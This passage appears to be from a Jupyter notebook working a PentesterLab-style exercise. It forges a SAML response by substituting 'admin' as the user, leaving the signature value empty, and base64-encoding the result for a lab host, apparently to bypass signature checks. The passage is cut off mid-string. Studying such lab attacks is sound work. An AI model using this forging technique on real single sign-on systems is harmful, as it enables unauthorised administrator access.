       "'<samlp:Response ID=\"_e0eccbf0-8b87-013b-8bcb-0242ac10003f\" Version=\"2.0\" IssueInstant=\"2023-02-10T15:45:33Z\" Destination=\"http://ptl-846b660e-ed96ed03.libcurl.so:80/saml/consume\" Consent=\"urn:oasis:names:tc:SAML:2.0:consent:unspecified\" InResponseTo=\"_22775ed7-bf18-43ed-94bf-2f763c68fe55\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"><Issuer xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\">http://idp-ptl-846b660e-ed96ed03.libcurl.so/saml/auth</Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><Assertion xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_e0eccda0-8b87-013b-8bcb-0242ac10003f\" IssueInstant=\"2023-02-10T15:45:33Z\" Version=\"2.0\"><Issuer>http://idp-ptl-846b660e-ed96ed03.libcurl.so/saml/auth</Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:CanonicalizationMethod><ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"></ds:SignatureMethod><ds:Reference URI=\"#_e0eccda0-8b87-013b-8bcb-0242ac10003f\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"></ds:Transform><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:Transform></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"></ds:DigestMethod><ds:DigestValue>RlfEpvvQe2NYqDIHw9FkrryKUrw5YIoQnIHT1iMR2mc=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue></ds:SignatureValue><KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><ds:X509Data><ds:X509Certificate>MIIFNjCCAx4CCQDOVl3CrrCx1jANBgkqhkiG9w0BAQsFADBdMQswCQYDVQQGEwJBVTERMA8GA1UECAwIVmljdG9yaWExEjAQBgNVBAcMCU1lbGJvdXJuZTEVMBMGA1UECgwMUGVudGVzdGVyTGFiMRAwDgYDVQQDDAdzYW1sX2lpMB4XDTIwMDYwNDAxNDQ0N1oXDTIzMDMwMTAxNDQ0N1owXTELMAkGA1UEBhMCQVUxETAPBgNVBAgMCFZpY3RvcmlhMRIwEAYDVQQHDAlNZWxib3VybmUxFTATBgNVBAoMDFBlbnRlc3RlckxhYjEQMA4GA1UEAwwHc2FtbF9paTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBALfyobcgX4ONGZOYARsMZtHEFw+G+RTB8B7xQTptL0D6vDavmcKQAlRqEnGdoNRkENVOdTIJa5N9Jts+wrSy9itleGFc2j33v8Z+C4vazNNHC618ob8GYM/Z+Cuii5/YsrIrKLidVKb86HQehHBPi85KBqAlCpIEJw4JsU6AtBanhgDfRQV/+N0rCCn9kNN9d1SDsDgjgrQgwVYVpo7QNNQArkGZ92QXgXa7py0g6cmmuhDgQdh7vZkDUN96wPh33L21VMSiQ+W/iKIPlsI3rAGKBcS5DKPWbYlEu3ogug3DLzWlix/ojmKY9p2iEIi5eA5wglvZA/7ZY3L1s7pWO3wFtT0j3RaaCP1Xgb1RRDaiiIIw+y0Vt27I1a+N+y+4efWyl4x8+HrPlxhyRojvQYhjnCGzfuIJrIPg2DaGrVH9+YE1Cu2gzWZhIE7LXGuTBIfaVEAL/u4dlpiYhYLt6hh4aQnzhFsZ8zyA6QKBaoyFNwJhkOcAVcWicgGVm30ZD++JfT3+WuJ1TcMsfKW6w7C4U4UwM1MW6i6gAJqANM4tW7b1uZm3z28tTECb3HmuDqjbtTi4rvLFhO41/ivZY8V0avuhho0HWBtM22JHoptJ+CLfaDEtHokYrtfmLUIhBmozdswELALGeH+WgqjfarrrDnx5QLk5TDep2DOXUF7NAgMBAAEwDQYJKoZIhvcNAQELBQADggIBAF4q2VO2mimIQvIHvdEP1MsmbbQCF5Fl78c8yWquroUyO+CaQ6Lz6eSYtvHL74BArv8Xm/t6zFpHOKEVex9ZffZZM0HEpi8G/ixFenTvMr1H9NDf+9WG12FFJOJ93b644G1WynkdrPtQ8kiT7WdTaRlCKqAZrozuzCdexBFJL7QH1yCFAETUJ/O5U1rl6ZGTqH5VA5DtBiSGhiraiqWbJ8ENazjsmY5fMi19HlYg8pnou1S6xYaaiKpNdmdbrt5iFZN/j+QKVKt+6u9eeyYgqM7zP20l1CA7M5EjuAiXeKlIfBO5xTiWCou+a3UJncSN3DVABTbb/QlyY7lZhUP7toAjag2P3lm237HnG3cTUZR6+bQiFKgK4mIMNtGYJ9SFNN2H2872rTXmz7ix0iE+yI/YPGdV5RUFa2Cw1cLqZ6XgByoyCfXw1XwC9XKNEtjwW2QyX+C4jJjoI5LxhB95TOa/W40F/HoO+/FrjXftfYTHeFi75hz8OyIba5MlRtE4AO/h3ibx91c3OHYrmghsm51rRtJj2/xuXG808GciKct2D5oXVXAls0KWzl2q8il8ZguMbRHyKte4EBbBN8q6YcEzFIGfH7PwaV67m7jo6bICd2ODOFDES2YeIEryZCvXLb3vgSt/zBm/A843DbYi5SUJGWhBQ5Xn3MR7hyz/nLRq</ds:X509Certificate></ds:X509Data></KeyInfo></ds:Signature><Subject><NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\">admin@libcurl.so</NameID><SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><SubjectConfirmationData InResponseTo=\"_22775ed7-bf18-43ed-94bf-2f763c68fe55\" NotOnOrAfter=\"2023-02-10T15:48:33Z\" Recipient=\"http://ptl-846b660e-ed96ed03.libcurl.so:80/saml/consume\"></SubjectConfirmationData></SubjectConfirmation></Subject><Conditions NotBefore=\"2023-02-10T15:45:28Z\" NotOnOrAfter=\"2023-02-10T16:45:33Z\"><AudienceRestriction><Audience>http://ptl-846b660e-ed96ed03.libcurl.so:80/saml/auth</Audience></AudienceRestriction></Conditions><AuthnStatement AuthnInstant=\"2023-02-10T15:45:33Z\" SessionIndex=\"_e0eccda0-8b87-013b-8bcb-0242ac10003f\"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion></samlp:Response>'"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str3 = str5.replace(SAML_resp2,'admin')\n",
    "str3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "30d08246",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'PHNhbWxwOlJlc3BvbnNlIElEPSJfZTBlY2NiZjAtOGI4Ny0wMTNiLThiY2ItMDI0MmFjMTAwMDNmIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyMy0wMi0xMFQxNTo0NTozM1oiIERlc3RpbmF0aW9uPSJodHRwOi8vcHRsLTg0NmI2NjBlLWVkOTZlZDAzLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJfMjI3NzVlZDctYmYxOC00M2VkLTk0YmYtMmY3NjNjNjhmZTU1IiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vaWRwLXB0bC04NDZiNjYwZS1lZDk2ZWQwMy5saWJjdXJsLnNvL3NhbWwvYXV0aDwvSXNzdWVyPjxzYW1scDpTdGF0dXM+PHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfZTBlY2NkYTAtOGI4Ny0wMTNiLThiY2ItMDI0MmFjMTAwMDNmIiBJc3N1ZUluc3RhbnQ9IjIwMjMtMDItMTBUMTU6NDU6MzNaIiBWZXJzaW9uPSIyLjAiPjxJc3N1ZXI+aHR0cDovL2lkcC1wdGwtODQ2YjY2MGUtZWQ5NmVkMDMubGliY3VybC5zby9zYW1sL2F1dGg8L0lzc3Vlcj48ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6U2lnbmVkSW5mbyB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZD48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiI+PC9kczpTaWduYXR1cmVNZXRob2Q+PGRzOlJlZmVyZW5jZSBVUkk9IiNfZTBlY2NkYTAtOGI4Ny0wMTNiLThiY2ItMDI0MmFjMTAwMDNmIj48ZHM6VHJhbnNmb3Jtcz48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI2VudmVsb3BlZC1zaWduYXR1cmUiPjwvZHM6VHJhbnNmb3JtPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6VHJhbnNmb3JtPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ij48L2RzOkRpZ2VzdE1ldGhvZD48ZHM6RGlnZXN0VmFsdWU+UmxmRXB2dlFlMk5ZcURJSHc5RmtycnlLVXJ3NVlJb1FuSUhUMWlNUjJtYz08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU+PC9kczpTaWduYXR1cmVWYWx1ZT48S2V5SW5mbyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU+TUlJRk5qQ0NBeDRDQ1FET1ZsM0NyckN4MWpBTkJna3Foa2lHOXcwQkFRc0ZBREJkTVFzd0NRWURWUVFHRXdKQlZURVJNQThHQTFVRUNBd0lWbWxqZEc5eWFXRXhFakFRQmdOVkJBY01DVTFsYkdKdmRYSnVaVEVWTUJNR0ExVUVDZ3dNVUdWdWRHVnpkR1Z5VEdGaU1SQXdEZ1lEVlFRRERBZHpZVzFzWDJscE1CNFhEVEl3TURZd05EQXhORFEwTjFvWERUSXpNRE13TVRBeE5EUTBOMW93WFRFTE1Ba0dBMVVFQmhNQ1FWVXhFVEFQQmdOVkJBZ01DRlpwWTNSdmNtbGhNUkl3RUFZRFZRUUhEQWxOWld4aWIzVnlibVV4RlRBVEJnTlZCQW9NREZCbGJuUmxjM1JsY2t4aFlqRVFNQTRHQTFVRUF3d0hjMkZ0YkY5cGFUQ0NBaUl3RFFZSktvWklodmNOQVFFQkJRQURnZ0lQQURDQ0Fnb0NnZ0lCQUxmeW9iY2dYNE9OR1pPWUFSc01adEhFRncrRytSVEI4Qjd4UVRwdEwwRDZ2RGF2bWNLUUFsUnFFbkdkb05Sa0VOVk9kVElKYTVOOUp0cyt3clN5OWl0bGVHRmMyajMzdjhaK0M0dmF6Tk5IQzYxOG9iOEdZTS9aK0N1aWk1L1lzcklyS0xpZFZLYjg2SFFlaEhCUGk4NUtCcUFsQ3BJRUp3NEpzVTZBdEJhbmhnRGZSUVYvK04wckNDbjlrTk45ZDFTRHNEZ2pnclFnd1ZZVnBvN1FOTlFBcmtHWjkyUVhnWGE3cHkwZzZjbW11aERnUWRoN3Zaa0RVTjk2d1BoMzNMMjFWTVNpUStXL2lLSVBsc0kzckFHS0JjUzVES1BXYllsRXUzb2d1ZzNETHpXbGl4L29qbUtZOXAyaUVJaTVlQTV3Z2x2WkEvN1pZM0wxczdwV08zd0Z0VDBqM1JhYUNQMVhnYjFSUkRhaWlJSXcreTBWdDI3STFhK04reSs0ZWZXeWw0eDgrSHJQbHhoeVJvanZRWWhqbkNHemZ1SUpySVBnMkRhR3JWSDkrWUUxQ3UyZ3pXWmhJRTdMWEd1VEJJZmFWRUFML3U0ZGxwaVloWUx0NmhoNGFRbnpoRnNaOHp5QTZRS0Jhb3lGTndKaGtPY0FWY1dpY2dHVm0zMFpEKytKZlQzK1d1SjFUY01zZktXNnc3QzRVNFV3TTFNVzZpNmdBSnFBTk00dFc3YjF1Wm0zejI4dFRFQ2IzSG11RHFqYnRUaTRydkxGaE80MS9pdlpZOFYwYXZ1aGhvMEhXQnRNMjJKSG9wdEorQ0xmYURFdEhva1lydGZtTFVJaEJtb3pkc3dFTEFMR2VIK1dncWpmYXJyckRueDVRTGs1VERlcDJET1hVRjdOQWdNQkFBRXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnSUJBRjRxMlZPMm1pbUlRdklIdmRFUDFNc21iYlFDRjVGbDc4Yzh5V3F1cm9VeU8rQ2FRNkx6NmVTWXR2SEw3NEJBcnY4WG0vdDZ6RnBIT0tFVmV4OVpmZlpaTTBIRXBpOEcvaXhGZW5Udk1yMUg5TkRmKzlXRzEyRkZKT0o5M2I2NDRHMVd5bmtkclB0UThraVQ3V2RUYVJsQ0txQVpyb3p1ekNkZXhCRkpMN1FIMXlDRkFFVFVKL081VTFybDZaR1RxSDVWQTVEdEJpU0doaXJhaXFXYko4RU5hempzbVk1Zk1pMTlIbFlnOHBub3UxUzZ4WWFhaUtwTmRtZGJydDVpRlpOL2orUUtWS3QrNnU5ZWV5WWdxTTd6UDIwbDFDQTdNNUVqdUFpWGVLbElmQk81eFRpV0NvdSthM1VKbmNTTjNEVkFCVGJiL1FseVk3bFpoVVA3dG9BamFnMlAzbG0yMzdIbkczY1RVWlI2K2JRaUZLZ0s0bUlNTnRHWUo5U0ZOTjJIMjg3MnJUWG16N2l4MGlFK3lJL1lQR2RWNVJVRmEyQ3cxY0xxWjZYZ0J5b3lDZlh3MVh3QzlYS05FdGp3VzJReVgrQzRqSmpvSTVMeGhCOTVUT2EvVzQwRi9Ib08rL0ZyalhmdGZZVEhlRmk3NWh6OE95SWJhNU1sUnRFNEFPL2gzaWJ4OTFjM09IWXJtZ2hzbTUxclJ0SmoyL3h1WEc4MDhHY2lLY3QyRDVvWFZYQWxzMEtXemwycThpbDhaZ3VNYlJIeUt0ZTRFQmJCTjhxNlljRXpGSUdmSDdQd2FWNjdtN2pvNmJJQ2QyT0RPRkRFUzJZZUlFcnlaQ3ZYTGIzdmdTdC96Qm0vQTg0M0RiWWk1U1VKR1doQlE1WG4zTVI3aHl6L25MUnE8L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvS2V5SW5mbz48L2RzOlNpZ25hdHVyZT48U3ViamVjdD48TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6cGVyc2lzdGVudCI+YWRtaW5AbGliY3VybC5zbzwvTmFtZUlEPjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+PFN1YmplY3RDb25maXJtYXRpb25EYXRhIEluUmVzcG9uc2VUbz0iXzIyNzc1ZWQ3LWJmMTgtNDNlZC05NGJmLTJmNzYzYzY4ZmU1NSIgTm90T25PckFmdGVyPSIyMDIzLTAyLTEwVDE1OjQ4OjMzWiIgUmVjaXBpZW50PSJodHRwOi8vcHRsLTg0NmI2NjBlLWVkOTZlZDAzLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIj48L1N1YmplY3RDb25maXJtYXRpb25EYXRhPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q+PENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDIzLTAyLTEwVDE1OjQ1OjI4WiIgTm90T25PckFmdGVyPSIyMDIzLTAyLTEwVDE2OjQ1OjMzWiI+PEF1ZGllbmNlUmVzdHJpY3Rpb24+PEF1ZGllbmNlPmh0dHA6Ly9wdGwtODQ2YjY2MGUtZWQ5NmVkMDMubGliY3VybC5zbzo4MC9zYW1sL2F1dGg8L0F1ZGllbmNlPjwvQXVkaWVuY2VSZXN0cmljdGlvbj48L0NvbmRpdGlvbnM+PEF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAyMy0wMi0xMFQxNTo0NTozM1oiIFNlc3Npb25JbmRleD0iX2UwZWNjZGEwLThiODctMDEzYi04YmNiLTAyNDJhYzEwMDAzZiI+PEF1dGhuQ29udGV4dD48QXV0aG5Db250ZXh0Q2xhc3NSZWY+dXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmQ8L0F1dGhuQ29udGV4dENsYXNzUmVmPjwvQXV0aG5Db250ZXh0PjwvQXV0aG5TdGF0ZW1lbnQ+PC9Bc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4='"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str4 = base64.b64encode(str3.encode())\n",
    "str4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "ec5ec701",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'PHNhbWxwOlJlc3BvbnNlIElEPSJfZTBlY2NiZjAtOGI4Ny0wMTNiLThiY2ItMDI0MmFjMTAwMDNmIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyMy0wMi0xMFQxNTo0NTozM1oiIERlc3RpbmF0aW9uPSJodHRwOi8vcHRsLTg0NmI2NjBlLWVkOTZlZDAzLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJfMjI3NzVlZDctYmYxOC00M2VkLTk0YmYtMmY3NjNjNjhmZTU1IiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vaWRwLXB0bC04NDZiNjYwZS1lZDk2ZWQwMy5saWJjdXJsLnNvL3NhbWwvYXV0aDwvSXNzdWVyPjxzYW1scDpTdGF0dXM+PHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfZTBlY2NkYTAtOGI4Ny0wMTNiLThiY2ItMDI0MmFjMTAwMDNmIiBJc3N1ZUluc3RhbnQ9IjIwMjMtMDItMTBUMTU6NDU6MzNaIiBWZXJzaW9uPSIyLjAiPjxJc3N1ZXI+aHR0cDovL2lkcC1wdGwtODQ2YjY2MGUtZWQ5NmVkMDMubGliY3VybC5zby9zYW1sL2F1dGg8L0lzc3Vlcj48ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6U2lnbmVkSW5mbyB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZD48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiI+PC9kczpTaWduYXR1cmVNZXRob2Q+PGRzOlJlZmVyZW5jZSBVUkk9IiNfZTBlY2NkYTAtOGI4Ny0wMTNiLThiY2ItMDI0MmFjMTAwMDNmIj48ZHM6VHJhbnNmb3Jtcz48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI2VudmVsb3BlZC1zaWduYXR1cmUiPjwvZHM6VHJhbnNmb3JtPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6VHJhbnNmb3JtPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ij48L2RzOkRpZ2VzdE1ldGhvZD48ZHM6RGlnZXN0VmFsdWU+UmxmRXB2dlFlMk5ZcURJSHc5RmtycnlLVXJ3NVlJb1FuSUhUMWlNUjJtYz08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU+PC9kczpTaWduYXR1cmVWYWx1ZT48S2V5SW5mbyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU+TUlJRk5qQ0NBeDRDQ1FET1ZsM0NyckN4MWpBTkJna3Foa2lHOXcwQkFRc0ZBREJkTVFzd0NRWURWUVFHRXdKQlZURVJNQThHQTFVRUNBd0lWbWxqZEc5eWFXRXhFakFRQmdOVkJBY01DVTFsYkdKdmRYSnVaVEVWTUJNR0ExVUVDZ3dNVUdWdWRHVnpkR1Z5VEdGaU1SQXdEZ1lEVlFRRERBZHpZVzFzWDJscE1CNFhEVEl3TURZd05EQXhORFEwTjFvWERUSXpNRE13TVRBeE5EUTBOMW93WFRFTE1Ba0dBMVVFQmhNQ1FWVXhFVEFQQmdOVkJBZ01DRlpwWTNSdmNtbGhNUkl3RUFZRFZRUUhEQWxOWld4aWIzVnlibVV4RlRBVEJnTlZCQW9NREZCbGJuUmxjM1JsY2t4aFlqRVFNQTRHQTFVRUF3d0hjMkZ0YkY5cGFUQ0NBaUl3RFFZSktvWklodmNOQVFFQkJRQURnZ0lQQURDQ0Fnb0NnZ0lCQUxmeW9iY2dYNE9OR1pPWUFSc01adEhFRncrRytSVEI4Qjd4UVRwdEwwRDZ2RGF2bWNLUUFsUnFFbkdkb05Sa0VOVk9kVElKYTVOOUp0cyt3clN5OWl0bGVHRmMyajMzdjhaK0M0dmF6Tk5IQzYxOG9iOEdZTS9aK0N1aWk1L1lzcklyS0xpZFZLYjg2SFFlaEhCUGk4NUtCcUFsQ3BJRUp3NEpzVTZBdEJhbmhnRGZSUVYvK04wckNDbjlrTk45ZDFTRHNEZ2pnclFnd1ZZVnBvN1FOTlFBcmtHWjkyUVhnWGE3cHkwZzZjbW11aERnUWRoN3Zaa0RVTjk2d1BoMzNMMjFWTVNpUStXL2lLSVBsc0kzckFHS0JjUzVES1BXYllsRXUzb2d1ZzNETHpXbGl4L29qbUtZOXAyaUVJaTVlQTV3Z2x2WkEvN1pZM0wxczdwV08zd0Z0VDBqM1JhYUNQMVhnYjFSUkRhaWlJSXcreTBWdDI3STFhK04reSs0ZWZXeWw0eDgrSHJQbHhoeVJvanZRWWhqbkNHemZ1SUpySVBnMkRhR3JWSDkrWUUxQ3UyZ3pXWmhJRTdMWEd1VEJJZmFWRUFML3U0ZGxwaVloWUx0NmhoNGFRbnpoRnNaOHp5QTZRS0Jhb3lGTndKaGtPY0FWY1dpY2dHVm0zMFpEKytKZlQzK1d1SjFUY01zZktXNnc3QzRVNFV3TTFNVzZpNmdBSnFBTk00dFc3YjF1Wm0zejI4dFRFQ2IzSG11RHFqYnRUaTRydkxGaE80MS9pdlpZOFYwYXZ1aGhvMEhXQnRNMjJKSG9wdEorQ0xmYURFdEhva1lydGZtTFVJaEJtb3pkc3dFTEFMR2VIK1dncWpmYXJyckRueDVRTGs1VERlcDJET1hVRjdOQWdNQkFBRXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnSUJBRjRxMlZPMm1pbUlRdklIdmRFUDFNc21iYlFDRjVGbDc4Yzh5V3F1cm9VeU8rQ2FRNkx6NmVTWXR2SEw3NEJBcnY4WG0vdDZ6RnBIT0tFVmV4OVpmZlpaTTBIRXBpOEcvaXhGZW5Udk1yMUg5TkRmKzlXRzEyRkZKT0o5M2I2NDRHMVd5bmtkclB0UThraVQ3V2RUYVJsQ0txQVpyb3p1ekNkZXhCRkpMN1FIMXlDRkFFVFVKL081VTFybDZaR1RxSDVWQTVEdEJpU0doaXJhaXFXYko4RU5hempzbVk1Zk1pMTlIbFlnOHBub3UxUzZ4WWFhaUtwTmRtZGJydDVpRlpOL2orUUtWS3QrNnU5ZWV5WWdxTTd6UDIwbDFDQTdNNUVqdUFpWGVLbElmQk81eFRpV0NvdSthM1VKbmNTTjNEVkFCVGJiL1FseVk3bFpoVVA3dG9BamFnMlAzbG0yMzdIbkczY1RVWlI2K2JRaUZLZ0s0bUlNTnRHWUo5U0ZOTjJIMjg3MnJUWG16N2l4MGlFK3lJL1lQR2RWNVJVRmEyQ3cxY0xxWjZYZ0J5b3lDZlh3MVh3QzlYS05FdGp3VzJReVgrQzRqSmpvSTVMeGhCOTVUT2EvVzQwRi9Ib08rL0ZyalhmdGZZVEhlRmk3NWh6OE95SWJhNU1sUnRFNEFPL2gzaWJ4OTFjM09IWXJtZ2hzbTUxclJ0SmoyL3h1WEc4MDhHY2lLY3QyRDVvWFZYQWxzMEtXemwycThpbDhaZ3VNYlJIeUt0ZTRFQmJCTjhxNlljRXpGSUdmSDdQd2FWNjdtN2pvNmJJQ2QyT0RPRkRFUzJZZUlFcnlaQ3ZYTGIzdmdTdC96Qm0vQTg0M0RiWWk1U1VKR1doQlE1WG4zTVI3aHl6L25MUnE8L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvS2V5SW5mbz48L2RzOlNpZ25hdHVyZT48U3ViamVjdD48TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6cGVyc2lzdGVudCI+YWRtaW5AbGliY3VybC5zbzwvTmFtZUlEPjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+PFN1YmplY3RDb25maXJtYXRpb25EYXRhIEluUmVzcG9uc2VUbz0iXzIyNzc1ZWQ3LWJmMTgtNDNlZC05NGJmLTJmNzYzYzY4ZmU1NSIgTm90T25PckFmdGVyPSIyMDIzLTAyLTEwVDE1OjQ4OjMzWiIgUmVjaXBpZW50PSJodHRwOi8vcHRsLTg0NmI2NjBlLWVkOTZlZDAzLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIj48L1N1YmplY3RDb25maXJtYXRpb25EYXRhPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q+PENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDIzLTAyLTEwVDE1OjQ1OjI4WiIgTm90T25PckFmdGVyPSIyMDIzLTAyLTEwVDE2OjQ1OjMzWiI+PEF1ZGllbmNlUmVzdHJpY3Rpb24+PEF1ZGllbmNlPmh0dHA6Ly9wdGwtODQ2YjY2MGUtZWQ5NmVkMDMubGliY3VybC5zbzo4MC9zYW1sL2F1dGg8L0F1ZGllbmNlPjwvQXVkaWVuY2VSZXN0cmljdGlvbj48L0NvbmRpdGlvbnM+PEF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAyMy0wMi0xMFQxNTo0NTozM1oiIFNlc3Npb25JbmRleD0iX2UwZWNjZGEwLThiODctMDEzYi04YmNiLTAyNDJhYzEwMDAzZiI+PEF1dGhuQ29udGV4dD48QXV0aG5Db250ZXh0Q2xhc3NSZWY+dXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6M